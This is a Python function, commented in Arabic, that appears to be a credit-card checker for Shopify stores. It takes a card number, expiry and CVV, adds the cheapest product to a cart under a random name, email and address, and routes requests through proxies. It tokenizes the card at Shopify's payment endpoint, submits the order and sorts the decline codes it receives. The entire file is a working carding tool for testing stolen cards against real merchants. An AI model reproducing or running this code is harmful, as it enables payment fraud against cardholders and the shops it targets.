async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    """معالجة البطاقة مع تحسين الذاكرة"""
    
    async with request_semaphore:
        # تنظيف الذاكرة قبل البدء
        gc.collect()
        
        gateway = "UNKNOWN"
        total_price = "0.00"
        currency = "USD"
        
        ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
        proxy = parse_proxy(proxy_str) if proxy_str else None
        
        try:
            address = pick_addr(ourl)
            firstName, lastName = get_random_name()
            email = generate_email(firstName, lastName)
            
            connector = aiohttp.TCPConnector(
                ssl=False, 
                limit=CONNECTION_LIMIT,
                enable_cleanup_closed=True,
                force_close=True
            )
            timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                # إضافة المنتج للسلة
                cart_url = f"{ourl}/cart/add.js"
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json',
                    'Content-Type': 'application/x-www-form-urlencoded',
                }
                
                if not variant_id:
                    # جلب أرخص منتج
                    async with session.get(f"{ourl}/products.json", proxy=proxy) as resp:
                        if resp.status != 200:
                            return False, "Site error", gateway, total_price, currency
                        products = (await resp.json()).get('products', [])
                        for product in products:
                            for variant in product.get('variants', []):
                                if variant.get('available', True):
                                    variant_id = str(variant['id'])
                                    break
                            if variant_id:
                                break
                        if not variant_id:
                            return False, "No products", gateway, total_price, currency
                
                # إضافة للسلة
                async with session.post(cart_url, data=f'id={variant_id}&quantity=1', headers=headers, proxy=proxy) as resp:
                    if resp.status != 200:
                        return False, f"Cart failed: {resp.status}", gateway, total_price, currency
                
                # فتح صفحة الدفع
                checkout_url = f"{ourl}/checkout/"
                async with session.get(checkout_url, headers=headers, proxy=proxy, allow_redirects=True) as resp:
                    html = await resp.text()
                    checkout_url = str(resp.url)
                
                # استخراج session token
                sst = None
                for pattern in ['name="serialized-sessionToken" content="', '"sessionToken":"', 'data-session-token="']:
                    sst = extract_between(html, pattern, '"')
                    if sst:
                        break
                
                if not sst:
                    return False, "No session token", gateway, total_price, currency
                
                # استخراج معلومات أخرى
                attempt_token = checkout_url.split('/')[-1].split('?')[0]
                queueToken = extract_between(html, '"queueToken":"', '"') or ''
                stableId = extract_between(html, '"stableId":"', '"') or '1'
                
                # إرسال طلب GraphQL
                graphql_url = f"https://{urlparse(ourl).netloc}/checkouts/unstable/graphql"
                headers['x-checkout-one-session-token'] = sst
                
                # طلب الشحن
                variables = {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken,
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': []
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True}
                        }]
                    },
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {
                                'partialStreetAddress': {
                                    'address1': address['address1'],
                                    'city': address['city'],
                                    'countryCode': address['countryCode'],
                                    'postalCode': address['postalCode'],
                                    'firstName': firstName,
                                    'lastName': lastName,
                                    'zoneCode': address['zoneCode'],
                                    'phone': address['phone']
                                }
                            },
                            'targetMerchandiseLines': {'any': True},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'destinationChanged': True
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': []
                    },
                    'buyerIdentity': {
                        'customer': {'countryCode': address['countryCode']},
                        'email': email
                    }
                }
                
                json_data = {
                    'query': QUERY_PROPOSAL_SHIPPING,
                    'variables': variables,
                    'operationName': 'Proposal'
                }
                
                async with session.post(graphql_url, json=json_data, headers=headers, proxy=proxy) as resp:
                    try:
                        data = await resp.json()
                    except:
                        return False, "Invalid JSON", gateway, total_price, currency
                
                # التحقق من الاستجابة
                try:
                    seller = data.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                    if not seller:
                        return False, "No seller proposal", gateway, total_price, currency
                    
                    gateway = "Shopify"
                    total_price = seller.get('total', {}).get('value', {}).get('amount', '0.00')
                    currency = seller.get('total', {}).get('value', {}).get('currencyCode', 'USD')
                except:
                    pass
                
                # طلب الدفع
                variables['delivery']['deliveryLines'][0]['destinationChanged'] = False
                variables['payment']['billingAddress'] = {
                    'streetAddress': {
                        'address1': address['address1'],
                        'city': address['city'],
                        'countryCode': address['countryCode'],
                        'postalCode': address['postalCode'],
                        'firstName': firstName,
                        'lastName': lastName,
                        'zoneCode': address['zoneCode'],
                        'phone': address['phone']
                    }
                }
                
                json_data['query'] = QUERY_PROPOSAL_DELIVERY
                
                async with session.post(graphql_url, json=json_data, headers=headers, proxy=proxy) as resp:
                    try:
                        data = await resp.json()
                    except:
                        return False, "Invalid JSON", gateway, total_price, currency
                
                # الحصول على token الدفع
                vault_payload = {
                    "credit_card": {
                        "number": cc,
                        "month": int(mes),
                        "year": int(ano),
                        "verification_value": cvv,
                        "name": f"{firstName} {lastName}"
                    },
                    "payment_session_scope": urlparse(ourl).netloc
                }
                
                async with session.post('https://checkout.pci.shopifyinc.com/sessions', json=vault_payload, proxy=proxy) as resp:
                    try:
                        token_data = await resp.json()
                        token = token_data.get('id')
                    except:
                        return False, "Payment token failed", gateway, total_price, currency
                
                if not token:
                    return False, "No payment token", gateway, total_price, currency
                
                # إرسال الطلب النهائي
                submit_variables = {
                    'input': {
                        'sessionInput': {'sessionToken': sst},
                        'queueToken': queueToken,
                        'merchandise': variables['merchandise'],
                        'delivery': variables['delivery'],
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': 'shopify_payments',
                                        'sessionId': token,
                                        'billingAddress': variables['payment']['billingAddress']
                                    }
                                }
                            }],
                            'billingAddress': variables['payment']['billingAddress']
                        },
                        'buyerIdentity': variables['buyerIdentity']
                    },
                    'attemptToken': attempt_token,
                    'metafields': []
                }
                
                json_data = {
                    'query': MUTATION_SUBMIT,
                    'variables': submit_variables,
                    'operationName': 'SubmitForCompletion'
                }
                
                async with session.post(graphql_url, json=json_data, headers=headers, proxy=proxy) as resp:
                    try:
                        result = await resp.json()
                    except:
                        return False, "Invalid submit JSON", gateway, total_price, currency
                
                # تحليل النتيجة
                submit_data = result.get('data', {}).get('submitForCompletion', {})
                typename = submit_data.get('__typename', '')
                
                if typename in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    return True, "ORDER_PLACED", gateway, total_price, currency
                elif typename == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown')
                    return False, clean_response(reason), gateway, total_price, currency
                elif typename == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code', '')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Rejected", gateway, total_price, currency
                elif typename == 'Throttled':
                    return False, "Throttled", gateway, total_price, currency
                
                return False, "Unknown result", gateway, total_price, currency
                
        except Exception as e:
            return False, f"Error: {str(e)}", gateway, total_price, currency
        finally:
            gc.collect()

